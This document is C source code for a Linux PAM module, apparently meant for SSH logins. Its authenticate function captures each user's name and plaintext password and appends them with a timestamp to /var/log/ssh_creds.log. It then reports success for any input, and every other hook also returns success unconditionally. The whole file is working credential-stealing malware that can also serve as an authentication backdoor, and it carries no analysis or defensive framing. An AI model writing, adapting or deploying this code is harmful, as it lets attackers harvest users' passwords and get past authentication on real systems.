#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define LOG_FILE  "/var/log/ssh_creds.log"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
        const char *username = "unknown";
        const char *password = "unknown";
        int retval;

        retval = pam_get_user(pamh, &username, NULL);
        if(retval != PAM_SUCCESS) {
                username = "unknown";
        }

        const void *password_ptr;
        retval = pam_get_item(pamh, PAM_AUTHTOK, &password_ptr);
        if(retval == PAM_SUCCESS && password_ptr != NULL) {
                password = (const char*)password_ptr;
        }

        FILE *logfile = fopen(LOG_FILE, "a");
        if(logfile != NULL){
                time_t now;
                time(&now);
                struct tm *tm_info = localtime(&now);
                char timestamp[20];
                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
                fprintf(logfile, "[%s] Username: %s Password: %s \n", timestamp, username, password);
                fclose(logfile);
        }
        return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}